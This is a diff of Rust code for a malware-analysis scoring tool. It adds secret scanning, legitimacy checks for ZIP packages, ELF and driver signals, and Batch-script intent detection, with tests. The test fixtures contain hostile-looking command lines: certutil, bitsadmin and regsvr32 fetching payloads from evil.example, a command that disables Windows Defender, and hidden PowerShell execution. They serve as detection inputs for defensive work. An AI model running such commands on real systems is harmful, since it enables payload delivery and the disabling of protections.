@@ -3,9 +3,11 @@
 // Extracts signals from AnalysisResult into SignalSet, then delegates
 // scoring to the anya-scoring crate.
 
-use crate::output::{AnalysisResult, ConfidenceLevel, MitreTechnique, SectionInfo};
+use crate::output::{AnalysisResult, ConfidenceLevel, MitreTechnique, SecretFinding, SectionInfo};
 use anya_scoring::types::{AntiAnalysisSignal, IocSignal, PackerSignal, ScoringResult, SignalSet};
+use regex::Regex;
 use std::collections::HashMap;
+use std::sync::LazyLock;
 
 // Re-export scoring functions and types.
 pub use anya_scoring::confidence::{
@@ -20,6 +22,106 @@ pub use anya_scoring::confidence::{
     BONUS_ORDINAL_NTDLL, BONUS_PACKER_HIGH, BONUS_PACKER_MEDIUM, BONUS_SUSPICIOUS_API_COUNT,
     BONUS_TLS_CALLBACKS, BONUS_WX_SECTION, WEIGHT_CRITICAL, WEIGHT_HIGH, WEIGHT_LOW, WEIGHT_MEDIUM,
 };
+
+/// Detect a legitimate-package ZIP layout from the lowercased entry
+/// names. Matches package manifests (JAR, Python wheel, Chrome
+/// extension, APK, NuGet, Office OOXML) first, then falls back to
+/// all-scripts source distributions, then to common build-tree
+/// markers (src/, /docs/, makefile, etc.).
+fn detect_zip_legitimacy(names_lower: &[String]) -> bool {
+    if names_lower.is_empty() {
+        return false;
+    }
+
+    const PKG_MARKERS: &[&str] = &[
+        "meta-inf/",            // JAR
+        "manifest.mf",          // JAR
+        "manifest.json",        // Chrome ext / WebExtension / npm
+        "androidmanifest.xml",  // APK
+        "classes.dex",          // APK
+        ".dist-info/",          // Python wheel
+        ".dist-info\\",         // Python wheel (windows path)
+        "package.json",         // npm
+        "composer.json",        // PHP composer
+        "pom.xml",              // Maven
+        "build.gradle",         // Gradle
+        "gradle-wrapper.jar",   // Gradle wrapper
+        "pubspec.yaml",         // Dart
+        "cargo.toml",           // Rust
+        "install.rdf",          // Firefox extension (legacy)
+        "chrome.manifest",      // Firefox/Thunderbird extension
+        "content/",             // XPI addon structure
+        "modules/",             // XPI addon structure
+        "__init__.py",          // Python package
+        "site-packages/",       // Python
+        "nuspec",               // NuGet
+        "[content_types].xml",  // Office OOXML
+        "ppt/presentation.xml", // pptx
+        "word/document.xml",    // docx
+        "xl/workbook.xml",      // xlsx
+        "mimetype",             // ODT/EPUB (bottom of archive)
+    ];
+    if names_lower
+        .iter()
+        .any(|name| PKG_MARKERS.iter().any(|m| name.contains(m)))
+    {
+        return true;
+    }
+
+    // Fallback 1: every entry ends in a script/source extension.
+    const SCRIPT_EXTS: &[&str] = &[
+        ".py", ".pl", ".rb", ".js", ".sh", ".lua", ".php", ".ts", ".tcl", ".awk", ".sed", ".ml",
+        ".hs", ".coffee", ".cs", ".java", ".kt", ".scala", ".go", ".rs", ".c", ".cpp", ".h",
+        ".hpp", ".cc", ".cxx", ".m", ".mm", ".swift", ".r", ".jl",
+    ];
+    if !names_lower.is_empty()
+        && names_lower
+            .iter()
+            .all(|n| SCRIPT_EXTS.iter().any(|ext| n.ends_with(ext)))
+    {
+        return true;
+    }
+
+    // Fallback 2: common source-tree / build-system markers.
+    const DISTRO_MARKERS: &[&str] = &[
+        "/src/",
+        "src/main/",
+        "src/test/",
+        "/source/",
+        "/dist/",
+        "/lib/",
+        "/bin/",
+        "/build/",
+        "build.xml",
+        "build.sh",
+        "build.bat",
+        "buildall.sh",
+        "buildall.bat",
+        "configure.ac",
+        "configure.in",
+        "autogen.sh",
+        "makefile",
+        "cmakelists.txt",
+        "cmake/",
+        "/tests/",
+        "/examples/",
+        "/doc/",
+        "/docs/",
+        "readme.md",
+        "readme.txt",
+        "license.txt",
+        "license.md",
+        "changelog.md",
+        "changelog.txt",
+        "contributing.md",
+        "copying",
+        "/include/",
+        "/javadoc/",
+    ];
+    names_lower
+        .iter()
+        .any(|name| DISTRO_MARKERS.iter().any(|m| name.contains(m)))
+}
 
 /// Extract signals from an AnalysisResult into a SignalSet for scoring.
 pub fn extract_signals(result: &AnalysisResult) -> SignalSet {
@@ -167,11 +269,35 @@ pub fn extract_signals(result: &AnalysisResult) -> SignalSet {
             s.pe_has_crypto_imports = libs.iter().any(|l| l == "crypt32.dll" || l == "bcrypt.dll");
             s.pe_has_process_imports = libs.iter().any(|l| l == "psapi.dll");
         }
+        // M5.3 sub-5: EP signature matches flow through from the PE
+        // parser so the scoring layer can add a packer detection
+        // without re-scanning the file.
+        s.pe_ep_signature_matches = pe.ep_signature_matches.clone();
+        s.pe_ep_signature_family = pe.ep_signature_family.clone();
         s.pe_has_known_compiler = pe
             .compiler
             .as_ref()
             .map(|c| !c.name.is_empty() && c.name != "Unknown")
             .unwrap_or(false);
+        // Cat B quick-win (Layer 1.8): Rich header → known-compiler
+        // promotion. If the raw PE JSON reports compiler="Unknown" but
+        // detect_toolchain can identify the toolchain via Rich header,
+        // imports, or section names, trust the stronger signal. This
+        // fixes FPs on legitimate unsigned binaries like lzfse.exe
+        // (Apple), wininst-*.exe (Python), and small MSVC utilities
+        // that ship without version info or Authenticode. Mirrors the
+        // rescore_v2.py promotion logic.
+        if !s.pe_has_known_compiler {
+            let detected = detect_toolchain(pe);
+            if !detected.is_empty() {
+                s.pe_has_known_compiler = true;
+                // Also populate pe_toolchain now so subsequent checks
+                // (entropy thresholds, known-product suppression) don't
+                // have to wait until the separate detect_toolchain call
+                // below. The later assignment is a no-op in that case.
+                s.pe_toolchain = detected;
+            }
+        }
         // Suspicious PDB path detection
         // "shell" removed — false-positives on PowerShell paths
         if let Some(ref debug) = pe.debug_artifacts {
@@ -201,6 +327,16 @@ pub fn extract_signals(result: &AnalysisResult) -> SignalSet {
 
     // ── ELF signals ─────────────────────────────────────────────────────
     if let Some(ref elf) = result.elf_analysis {
+        // Cat C quick-win: capture the raw ELF e_type string and
+        // derive elf_is_shared_lib. "Shared Object" is the parser's
+        // label for ET_DYN; "Relocatable" for ET_REL (.o object
+        // files). Both suppress the suspicious-api and hardening
+        // checks downstream because libraries routinely trip the
+        // same signals without being malicious.
+        s.elf_file_type = elf.file_type.clone();
+        let ft_lower = elf.file_type.to_lowercase();
+        s.elf_is_shared_lib =
+            ft_lower.contains("shared") || ft_lower.contains("dyn") || ft_lower.contains("relocat");
         s.elf_is_pie = elf.is_pie;
         s.elf_has_nx = elf.has_nx_stack;
         s.elf_has_relro = elf.has_relro;
@@ -464,6 +600,88 @@ pub fn extract_signals(result: &AnalysisResult) -> SignalSet {
             .count();
     }
 
+    // ── Secrets detection ──────────────────────────────────────────
+    // Scan classified strings for structured credential patterns.
+    // Patterns are defined in the scoring crate (detection_patterns).
+    if let Some(ref classified) = result.strings.classified {
+        let (findings, count, has_private_key) = scan_secrets(classified);
+        s.secrets_count = count;
+        s.secrets_has_private_key = has_private_key;
+        // Store redacted findings on the result (caller patches this in)
+        // We use a thread-local side channel here; the caller reads it back.
+        LAST_SECRET_FINDINGS.with(|cell| {
+            *cell.borrow_mut() = if findings.is_empty() {
+                None
+            } else {
+                Some(findings)
+            };
+        });
+    }
+
+    // ── Cat C quick-win: Batch / shell intent signal extraction ────
+    // Runs only when the format or extension indicates a Batch-family
+    // script. Concatenates all classified string values into a blob
+    // (capped at 128 KB) and delegates the regex scan to
+    // anya_scoring::detection_patterns::count_batch_signals.
+    let is_batch_family = {
+        let fmt = result.file_format.to_lowercase();
+        let ext = s.file_extension.as_str();
+        fmt.contains("batch") || ext == "bat" || ext == "cmd"
+    };
+    if is_batch_family {
+        if let Some(ref classified) = result.strings.classified {
+            // Build the strings blob. Cap at 128 KB so pathologically
+            // large string sets don't blow up the regex scan budget.
+            const MAX_BLOB_BYTES: usize = 131072;
+            let mut blob = String::with_capacity(8192);
+            for cs in classified {
+                if blob.len() + cs.value.len() + 1 > MAX_BLOB_BYTES {
+                    break;
+                }
+                blob.push_str(&cs.value);
+                blob.push('\n');
+            }
+            let counts = anya_scoring::detection_patterns::count_batch_signals(&blob);
+            s.bat_lolbin_count = counts.lolbin;
+            s.bat_defender_tamper = counts.defender_tamper > 0;
+            s.bat_hidden_exec = counts.hidden_exec > 0;
+            s.bat_privesc = counts.privesc > 0;
+
+            // Feed the shell_* aggregation fields the same way the
+            // Python rescore does, so downstream shell/batch scoring
+            // has something to work with when the parser didn't
+            // populate shell_analysis.
+            if counts.download > 0
+                && (counts.lolbin > 0 || counts.privesc > 0 || counts.hidden_exec > 0)
+            {
+                s.shell_has_download_execute = true;
+            }
+            if counts.persistence > 0 {
+                s.shell_has_persistence = true;
+            }
+            let derived_shell_count = counts.lolbin
+                + counts.download
+                + counts.persistence
+                + counts.defender_tamper
+                + counts.hidden_exec
+                + counts.privesc;
+            if derived_shell_count > s.shell_suspicious_count {
+                s.shell_suspicious_count = derived_shell_count;
+            }
+        }
+    }
+
+    // ── Driver signal extraction ────────────────────────────────────
+    if let Some(ref pe) = result.pe_analysis {
+        if let Some(ref driver) = pe.driver_analysis {
+            s.pe_is_kernel_driver = driver.is_kernel_driver;
+            s.pe_driver_imports_ntoskrnl = driver.imports_ntoskrnl;
+            s.pe_driver_imports_hal = driver.imports_hal;
+            s.pe_driver_dangerous_api_count = driver.dangerous_kernel_apis.len();
+            s.pe_driver_is_signed = driver.is_signed;
+        }
+    }
+
     // ── Resource language analysis ───────────────────────────────────
     // PE resource language detection is not yet extracted by pe_parser;
     // populate from version info locale heuristic instead
@@ -549,6 +767,26 @@ pub fn extract_signals(result: &AnalysisResult) -> SignalSet {
         s.zip_has_encrypted_entries = zip.has_encrypted_entries;
         s.zip_has_double_extensions = zip.has_double_extensions;
         s.zip_has_path_traversal = zip.has_path_traversal;
+
+        // Cat A quick-win (Layer 1.8): collect lowercased entry names
+        // from both the executable list and the suspicious-entries list,
+        // cap at 50 total, and check for known legitimate-package
+        // markers. Mirrors the Python rescore logic. The calibrator
+        // strips the original extension to ".sample", so we can't rely
+        // on file_extension for .whl/.xpi/.jar detection — entry
+        // inspection is the only way.
+        let mut names_lower: Vec<String> = zip
+            .executable_names
+            .iter()
+            .take(50)
+            .map(|n| n.to_lowercase())
+            .collect();
+        for entry in zip.suspicious_entries.iter().take(50) {
+            names_lower.push(entry.to_lowercase());
+        }
+        s.zip_executable_names = names_lower.clone();
+
+        s.zip_is_legit_package = detect_zip_legitimacy(&names_lower);
     }
 
     // ── Media, markup & misc signals ──────────────────────────────────
@@ -734,6 +972,62 @@ pub fn is_benign_ioc(value: &str) -> bool {
         "::1",
     ];
     benign_domains.iter().any(|d| lower.contains(d))
+}
+
+// ── Secrets detection ───────────────────────────────────────────────────────
+
+// Thread-local storage to pass secret findings from extract_signals back to callers.
+// This avoids modifying the AnalysisResult inside extract_signals (which takes &).
+thread_local! {
+    pub static LAST_SECRET_FINDINGS: std::cell::RefCell<Option<Vec<SecretFinding>>> =
+        const { std::cell::RefCell::new(None) };
+}
+
+/// Compiled secret detection regex patterns, initialised once.
+static SECRET_REGEXES: LazyLock<Vec<(&'static str, Regex)>> = LazyLock::new(|| {
+    anya_scoring::detection_patterns::secret_patterns()
+        .into_iter()
+        .filter_map(|(name, pattern)| Regex::new(pattern).ok().map(|re| (name, re)))
+        .collect()
+});
+
+/// Scan classified strings for structured credential patterns.
+/// Returns (findings, total_count, has_private_key).
+fn scan_secrets(
+    classified: &[crate::output::ClassifiedString],
+) -> (Vec<SecretFinding>, usize, bool) {
+    let mut findings = Vec::new();
+    let mut has_private_key = false;
+
+    for cs in classified {
+        for (secret_type, re) in SECRET_REGEXES.iter() {
+            if re.is_match(&cs.value) {
+                // Redact: show first 8 chars + "..."
+                let preview = if cs.value.len() > 8 {
+                    format!("{}...", &cs.value[..8])
+                } else {
+                    cs.value.clone()
+                };
+                if *secret_type == "Private Key" {
+                    has_private_key = true;
+                }
+                findings.push(SecretFinding {
+                    secret_type: secret_type.to_string(),
+                    value_preview: preview,
+                });
+                break; // one match per string is sufficient
+            }
+        }
+    }
+
+    let count = findings.len();
+    (findings, count, has_private_key)
+}
+
+/// Retrieve the last set of secret findings from the thread-local.
+/// Call this after `extract_signals()` to get the findings for the AnalysisResult.
+pub fn take_secret_findings() -> Option<Vec<SecretFinding>> {
+    LAST_SECRET_FINDINGS.with(|cell| cell.borrow_mut().take())
 }
 
 // ── Compiler/toolchain fingerprinting ────────────────────────────────────────
@@ -1038,6 +1332,9 @@ mod tests {
             overlay_has_exe: false,
             string_density: 0.0,
             dotnet_metadata: None,
+            driver_analysis: None,
+            ep_signature_matches: vec![],
+            ep_signature_family: String::new(),
         }
     }
 
@@ -1112,6 +1409,14 @@ mod tests {
             iso_analysis: None,
             cab_analysis: None,
             msi_analysis: None,
+            vhd_analysis: None,
+            onenote_analysis: None,
+            img_analysis: None,
+            rar_analysis: None,
+            gzip_analysis: None,
+            sevenz_analysis: None,
+            tar_analysis: None,
+            secrets_detected: None,
             yara_matches: Vec::new(),
         }
     }
@@ -1222,5 +1527,720 @@ mod tests {
         assert_eq!(confidence_from_str("High"), ConfidenceLevel::High);
         assert_eq!(confidence_from_str("Critical"), ConfidenceLevel::Critical);
         assert_eq!(confidence_from_str("unknown"), ConfidenceLevel::Low);
+    }
+
+    // ── Secrets detection tests ────────────────────────────────────────────
+
+    fn make_classified(value: &str) -> ClassifiedString {
+        ClassifiedString {
+            value: value.to_string(),
+            category: "Plain".to_string(),
+            offset: None,
+            is_benign: false,
+        }
+    }
+
+    #[test]
+    fn test_scan_secrets_aws_access_key() {
+        let strings = vec![make_classified("AKIAIOSFODNN7EXAMPLE")];
+        let (findings, count, has_pk) = scan_secrets(&strings);
+        assert_eq!(count, 1);
+        assert!(!has_pk);
+        assert_eq!(findings[0].secret_type, "AWS Access Key");
+        // Value is redacted to first 8 chars
+        assert!(findings[0].value_preview.ends_with("..."));
+        assert_eq!(&findings[0].value_preview[..8], "AKIAIOSF");
+    }
+
+    #[test]
+    fn test_scan_secrets_jwt_token() {
+        let jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijklmnop";
+        let strings = vec![make_classified(jwt)];
+        let (findings, count, _) = scan_secrets(&strings);
+        assert_eq!(count, 1);
+        assert_eq!(findings[0].secret_type, "JWT Token");
+    }
+
+    #[test]
+    fn test_scan_secrets_private_key() {
+        let pk = "-----BEGIN RSA PRIVATE KEY-----\nMIIEpA...";
+        let strings = vec![make_classified(pk)];
+        let (_, count, has_pk) = scan_secrets(&strings);
+        assert_eq!(count, 1);
+        assert!(has_pk, "Private key should set has_private_key flag");
+    }
+
+    #[test]
+    fn test_scan_secrets_github_token() {
+        let token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn";
+        let strings = vec![make_classified(token)];
+        let (findings, count, _) = scan_secrets(&strings);
+        assert_eq!(count, 1);
+        assert_eq!(findings[0].secret_type, "GitHub Token");
+    }
+
+    #[test]
+    fn test_scan_secrets_no_false_positives_on_plain() {
+        let strings = vec![
+            make_classified("Hello World"),
+            make_classified("kernel32.dll"),
+            make_classified("CreateRemoteThread"),
+        ];
+        let (_, count, _) = scan_secrets(&strings);
+        assert_eq!(count, 0, "Plain strings should not match secret patterns");
+    }
+
+    #[test]
+    fn test_scan_secrets_redaction() {
+        let long_key = "AKIAIOSFODNN7EXAMPLELONG";
+        let strings = vec![make_classified(long_key)];
+        let (findings, _, _) = scan_secrets(&strings);
+        assert_eq!(findings[0].value_preview, "AKIAIOSF...");
+        // Full value must NOT appear in preview
+        assert!(!findings[0].value_preview.contains(long_key));
+    }
+
+    #[test]
+    fn test_scan_secrets_multiple() {
+        let strings = vec![
+            make_classified("AKIAIOSFODNN7EXAMPLE"),
+            make_classified("ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn"),
+            make_classified("-----BEGIN PRIVATE KEY-----"),
+        ];
+        let (_, count, has_pk) = scan_secrets(&strings);
+        assert_eq!(count, 3);
+        assert!(has_pk);
+    }
+
+    // ── Driver signal extraction tests ────────────────────────────────────
+
+    #[test]
+    fn test_driver_signals_extracted() {
+        let mut result = empty_result();
+        let mut pe = empty_pe();
+        pe.driver_analysis = Some(crate::output::DriverAnalysis {
+            is_kernel_driver: true,
+            imports_ntoskrnl: true,
+            imports_hal: false,
+            dangerous_kernel_apis: vec![
+                "IoCreateDevice".to_string(),
+                "ObRegisterCallbacks".to_string(),
+            ],
+            is_signed: false,
+        });
+        result.pe_analysis = Some(pe);
+        let signals = extract_signals(&result);
+        assert!(signals.pe_is_kernel_driver);
+        assert!(signals.pe_driver_imports_ntoskrnl);
+        assert!(!signals.pe_driver_imports_hal);
+        assert_eq!(signals.pe_driver_dangerous_api_count, 2);
+        assert!(!signals.pe_driver_is_signed);
+    }
+
+    #[test]
+    fn test_driver_signals_not_set_for_normal_pe() {
+        let mut result = empty_result();
+        result.pe_analysis = Some(empty_pe());
+        let signals = extract_signals(&result);
+        assert!(!signals.pe_is_kernel_driver);
+        assert_eq!(signals.pe_driver_dangerous_api_count, 0);
+    }
+
+    #[test]
+    fn test_secrets_signals_extracted() {
+        let mut result = empty_result();
+        result.strings.classified = Some(vec![
+            make_classified("AKIAIOSFODNN7EXAMPLE"),
+            make_classified("-----BEGIN PRIVATE KEY-----"),
+        ]);
+        let signals = extract_signals(&result);
+        assert_eq!(signals.secrets_count, 2);
+        assert!(signals.secrets_has_private_key);
+
+        // Also verify thread-local findings are populated
+        let findings = take_secret_findings();
+        assert!(findings.is_some());
+        let findings = findings.unwrap();
+        assert_eq!(findings.len(), 2);
+    }
+
+    #[test]
+    fn test_zip_legitimacy_jar_marker() {
+        let names: Vec<String> = vec![
+            "META-INF/MANIFEST.MF".to_lowercase(),
+            "com/example/Main.class".to_lowercase(),
+        ];
+        assert!(detect_zip_legitimacy(&names));
+    }
+
+    #[test]
+    fn test_zip_legitimacy_python_wheel() {
+        let names: Vec<String> = vec![
+            "example-1.0.dist-info/METADATA".to_lowercase(),
+            "example/__init__.py".to_lowercase(),
+        ];
+        assert!(detect_zip_legitimacy(&names));
+    }
+
+    #[test]
+    fn test_zip_legitimacy_apk_marker() {
+        let names: Vec<String> = vec![
+            "AndroidManifest.xml".to_lowercase(),
+            "classes.dex".to_lowercase(),
+        ];
+        assert!(detect_zip_legitimacy(&names));
+    }
+
+    #[test]
+    fn test_zip_legitimacy_ooxml_docx() {
+        let names: Vec<String> = vec![
+            "[Content_Types].xml".to_lowercase(),
+            "word/document.xml".to_lowercase(),
+        ];
+        assert!(detect_zip_legitimacy(&names));
+    }
+
+    #[test]
+    fn test_zip_legitimacy_all_scripts_fallback() {
+        let names: Vec<String> = vec![
+            "src/main.py".to_lowercase(),
+            "src/helper.py".to_lowercase(),
+            "tests/test_main.py".to_lowercase(),
+        ];
+        // src/ + /tests/ also matches distro markers, but the all-scripts
+        // fallback alone is enough.
+        assert!(detect_zip_legitimacy(&names));
+    }
+
+    #[test]
+    fn test_zip_legitimacy_source_tree_markers() {
+        let names: Vec<String> = vec![
+            "project/src/main.c".to_lowercase(),
+            "project/build.sh".to_lowercase(),
+            "project/readme.md".to_lowercase(),
+        ];
+        assert!(detect_zip_legitimacy(&names));
+    }
+
+    #[test]
+    fn test_zip_legitimacy_malicious_archive_not_flagged() {
+        let names: Vec<String> = vec![
+            "invoice.exe".to_lowercase(),
+            "readme.pdf.exe".to_lowercase(),
+        ];
+        assert!(!detect_zip_legitimacy(&names));
+    }
+
+    #[test]
+    fn test_zip_legitimacy_empty_is_not_legit() {
+        let names: Vec<String> = vec![];
+        assert!(!detect_zip_legitimacy(&names));
+    }
+
+    #[test]
+    fn test_zip_legitimacy_suppresses_scoring_detection() {
+        // Construct an AnalysisResult with a benign JAR-like ZIP.
+        let mut result = empty_result();
+        result.zip_analysis = Some(ZipAnalysis {
+            entry_count: 3,
+            has_executables: true,
+            executable_names: vec![
+                "META-INF/MANIFEST.MF".to_string(),
+                "com/example/Main.class".to_string(),
+                "lib/helper.jar".to_string(),
+            ],
+            has_encrypted_entries: false,
+            compression_ratio: 2.0,
+            has_double_extensions: false,
+            has_path_traversal: false,
+            suspicious_entries: vec![],
+        });
+        let signals = extract_signals(&result);
+        assert!(
+            signals.zip_is_legit_package,
+            "META-INF JAR marker should flag zip_is_legit_package"
+        );
+        assert!(signals.zip_has_executables);
+
+        // And the score_signals pass should NOT emit a ZIP-containing-exe
+        // detection when no corroborating signal is present.
+        let scoring = score_signals(&signals);
+        assert!(
+            !scoring
+                .detections
+                .iter()
+                .any(|(desc, _)| desc.starts_with("ZIP containing executable files")),
+            "legit JAR should not trigger ZIP-containing-exe detection"
+        );
+    }
+
+    #[test]
+    fn test_rich_header_promotes_unknown_compiler_to_msvc() {
+        // A PE with compiler.name = "Unknown" but a Rich header should
+        // promote to pe_has_known_compiler = true via the Cat B quick-win.
+        let mut result = empty_result();
+        let mut pe = empty_pe();
+        pe.compiler = Some(CompilerInfo {
+            name: "Unknown".to_string(),
+            confidence: "Low".to_string(),
+        });
+        pe.rich_header = Some(RichHeaderInfo {
+            xor_key: 0xDEADBEEF,
+            entries: vec![],
+        });
+        result.pe_analysis = Some(pe);
+        result.file_format = "Windows PE".to_string();
+
+        let signals = extract_signals(&result);
+        assert!(
+            signals.pe_has_known_compiler,
+            "Rich header should promote Unknown compiler to known"
+        );
+        assert_eq!(
+            signals.pe_toolchain, "msvc",
+            "Rich header presence implies MSVC toolchain"
+        );
+    }
+
+    #[test]
+    fn test_mingw_imports_promote_unknown_compiler() {
+        // A PE importing libgcc_s_seh-1.dll with compiler="Unknown"
+        // should promote to mingw via the import-based detection.
+        let mut result = empty_result();
+        let mut pe = empty_pe();
+        pe.compiler = Some(CompilerInfo {
+            name: "Unknown".to_string(),
+            confidence: "Low".to_string(),
+        });
+        pe.imports.libraries = vec![
+            "libgcc_s_seh-1.dll".to_string(),
+            "libstdc++-6.dll".to_string(),
+            "kernel32.dll".to_string(),
+        ];
+        result.pe_analysis = Some(pe);
+        result.file_format = "Windows PE".to_string();
+
+        let signals = extract_signals(&result);
+        assert!(
+            signals.pe_has_known_compiler,
+            "MinGW runtime libs should promote Unknown compiler"
+        );
+        assert_eq!(signals.pe_toolchain, "mingw");
+    }
+
+    #[test]
+    fn test_genuinely_unknown_compiler_stays_unknown() {
+        // A PE with no Rich header, no recognisable imports, no
+        // section markers, and compiler=Unknown should stay as
+        // pe_has_known_compiler = false. This is the "no evidence"
+        // case that the Low "No identified compiler" detection should
+        // still fire for.
+        let mut result = empty_result();
+        let mut pe = empty_pe();
+        pe.compiler = Some(CompilerInfo {
+            name: "Unknown".to_string(),
+            confidence: "Low".to_string(),
+        });
+        pe.imports.libraries = vec!["kernel32.dll".to_string()];
+        result.pe_analysis = Some(pe);
+        result.file_format = "Windows PE".to_string();
+
+        let signals = extract_signals(&result);
+        assert!(
+            !signals.pe_has_known_compiler,
+            "genuine unknowns (no rich header, no marker imports) should remain unknown"
+        );
+        assert_eq!(signals.pe_toolchain, "");
+    }
+
+    fn shared_lib_elf(missing_nx: bool, missing_pie: bool, missing_relro: bool) -> ELFAnalysis {
+        ELFAnalysis {
+            architecture: "x86_64".to_string(),
+            is_64bit: true,
+            file_type: "Shared Object".to_string(),
+            entry_point: "0x1000".to_string(),
+            interpreter: None,
+            sections: vec![],
+            imports: ElfImportAnalysis {
+                library_count: 0,
+                libraries: vec![],
+                dynamic_symbol_count: 0,
+                suspicious_functions: vec![],
+            },
+            is_pie: !missing_pie,
+            has_nx_stack: !missing_nx,
+            has_relro: !missing_relro,
+            is_stripped: false,
+            packer_indicators: vec![],
+            got_plt_suspicious: vec![],
+            rpath_anomalies: vec![],
+            has_dwarf_info: false,
+            interpreter_suspicious: false,
+            suspicious_section_names: vec![],
+            suspicious_libc_calls: vec![],
+        }
+    }
+
+    #[test]
+    fn test_elf_shared_lib_flag_extracted_from_file_type() {
+        let mut result = empty_result();
+        let mut elf = shared_lib_elf(false, false, false);
+        elf.file_type = "Shared Object".to_string();
+        result.elf_analysis = Some(elf);
+        result.file_format = "ELF 64-bit LSB shared object".to_string();
+
+        let signals = extract_signals(&result);
+        assert_eq!(signals.elf_file_type, "Shared Object");
+        assert!(
+            signals.elf_is_shared_lib,
+            "ELF with file_type=Shared Object should set elf_is_shared_lib"
+        );
+    }
+
+    #[test]
+    fn test_elf_relocatable_flags_as_shared_lib() {
+        // ET_REL object files get the same suppression class.
+        let mut result = empty_result();
+        let mut elf = shared_lib_elf(false, false, false);
+        elf.file_type = "Relocatable".to_string();
+        result.elf_analysis = Some(elf);
+        result.file_format = "ELF 64-bit LSB relocatable".to_string();
+
+        let signals = extract_signals(&result);
+        assert!(signals.elf_is_shared_lib);
+    }
+
+    #[test]
+    fn test_elf_executable_is_not_shared_lib() {
+        let mut result = empty_result();
+        let mut elf = shared_lib_elf(false, false, false);
+        elf.file_type = "Executable".to_string();
+        result.elf_analysis = Some(elf);
+        result.file_format = "ELF 64-bit LSB executable".to_string();
+
+        let signals = extract_signals(&result);
+        assert_eq!(signals.elf_file_type, "Executable");
+        assert!(
+            !signals.elf_is_shared_lib,
+            "regular executables should not set elf_is_shared_lib"
+        );
+    }
+
+    #[test]
+    fn test_elf_shared_lib_suppresses_missing_security_features() {
+        // A shared library missing PIE, NX, and RELRO should NOT trigger
+        // the "ELF missing all security features" detection because the
+        // Cat C quick-win suppresses hardening detections for shared libs.
+        let mut result = empty_result();
+        let mut elf = shared_lib_elf(true, true, true);
+        elf.file_type = "Shared Object".to_string();
+        result.elf_analysis = Some(elf);
+        result.file_format = "ELF 64-bit LSB shared object".to_string();
+
+        let signals = extract_signals(&result);
+        assert!(signals.elf_is_shared_lib);
+
+        let scoring = score_signals(&signals);
+        assert!(
+            !scoring
+                .detections
+                .iter()
+                .any(|(desc, _)| desc.starts_with("ELF missing")),
+            "shared libs should not trigger ELF hardening detections, found: {:?}",
+            scoring
+                .detections
+                .iter()
+                .map(|(d, _)| d)
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_elf_executable_still_flags_missing_security() {
+        // Sanity: a regular executable with PIE/NX/RELRO missing SHOULD
+        // still trigger the detection.
+        let mut result = empty_result();
+        let mut elf = shared_lib_elf(true, true, true);
+        elf.file_type = "Executable".to_string();
+        result.elf_analysis = Some(elf);
+        result.file_format = "ELF 64-bit LSB executable".to_string();
+
+        let signals = extract_signals(&result);
+        assert!(!signals.elf_is_shared_lib);
+
+        let scoring = score_signals(&signals);
+        assert!(
+            scoring
+                .detections
+                .iter()
+                .any(|(desc, _)| desc.starts_with("ELF missing")),
+            "regular executable missing all 3 should still flag"
+        );
+    }
+
+    fn batch_result_with_strings(strings: Vec<&str>) -> AnalysisResult {
+        let mut result = empty_result();
+        result.file_format = "Batch Script".to_string();
+        result.file_info.extension = Some("bat".to_string());
+        result.strings.classified = Some(strings.iter().map(|s| make_classified(s)).collect());
+        result
+    }
+
+    #[test]
+    fn test_batch_defender_tamper_fires_high() {
+        let result = batch_result_with_strings(vec![
+            "Set-MpPreference -DisableRealtimeMonitoring $true",
+            "powershell -WindowStyle Hidden -Command \"& { ... }\"",
+        ]);
+        let signals = extract_signals(&result);
+        assert!(
+            signals.bat_defender_tamper,
+            "Set-MpPreference should set bat_defender_tamper"
+        );
+        assert!(
+            signals.bat_hidden_exec,
+            "-WindowStyle Hidden should set bat_hidden_exec"
+        );
+
+        let scoring = score_signals(&signals);
+        assert!(
+            scoring
+                .detections
+                .iter()
+                .any(|(desc, _)| desc.contains("tamper with Windows Defender")),
+            "defender-tamper detection should fire"
+        );
+    }
+
+    #[test]
+    fn test_batch_privesc_fires_medium() {
+        let result = batch_result_with_strings(vec![
+            "runas /user:Administrator cmd.exe",
+            "RUNASINVOKER __COMPAT_LAYER=RUNASINVOKER",
+        ]);
+        let signals = extract_signals(&result);
+        assert!(signals.bat_privesc);
+
+        let scoring = score_signals(&signals);
+        assert!(
+            scoring
+                .detections
+                .iter()
+                .any(|(desc, _)| desc.contains("privilege-escalation bypass")),
+            "privesc detection should fire"
+        );
+    }
+
+    #[test]
+    fn test_batch_lolbin_plus_hidden_fires_high() {
+        // LOLBin >= 2 AND hidden exec should fire the High detection.
+        let result = batch_result_with_strings(vec![
+            "certutil -urlcache -split -f http://evil.example/payload.exe",
+            "bitsadmin /transfer job http://evil.example/x.exe %TEMP%\\x.exe",
+            "powershell -WindowStyle Hidden -enc AABBCC",
+            "start /b /min payload.exe",
+        ]);
+        let signals = extract_signals(&result);
+        assert!(
+            signals.bat_lolbin_count >= 2,
+            "expected >= 2 LOLBins, got {}",
+            signals.bat_lolbin_count
+        );
+        assert!(signals.bat_hidden_exec);
+
+        let scoring = score_signals(&signals);
+        assert!(
+            scoring
+                .detections
+                .iter()
+                .any(|(desc, _)| desc.contains("LOLBins with hidden execution")),
+            "LOLBin+hidden High detection should fire"
+        );
+    }
+
+    #[test]
+    fn test_batch_lolbin_3plus_without_hidden_fires_medium() {
+        // LOLBin >= 3 without hidden should fire the Medium fallback.
+        let result = batch_result_with_strings(vec![
+            "certutil -decode payload.b64 payload.exe",
+            "bitsadmin /reset",
+            "rundll32 shell32.dll,Control_RunDLL",
+            "regsvr32 /s /u /i:http://evil.example/o.sct scrobj.dll",
+        ]);
+        let signals = extract_signals(&result);
+        assert!(signals.bat_lolbin_count >= 3);
+        assert!(
+            !signals.bat_hidden_exec,
+            "no hidden patterns in this fixture"
+        );
+
+        let scoring = score_signals(&signals);
+        assert!(
+            scoring
+                .detections
+                .iter()
+                .any(|(desc, lvl)| desc.contains("LOLBins (certutil/bitsadmin")
+                    && *lvl == anya_scoring::types::ConfidenceLevel::Medium),
+            "LOLBin>=3 Medium detection should fire"
+        );
+    }
+
+    #[test]
+    fn test_ep_signature_fields_flow_through_extractor() {
+        // When PEAnalysis has ep_signature_matches populated (as if
+        // pe_parser had matched a UPX stub), the extractor should
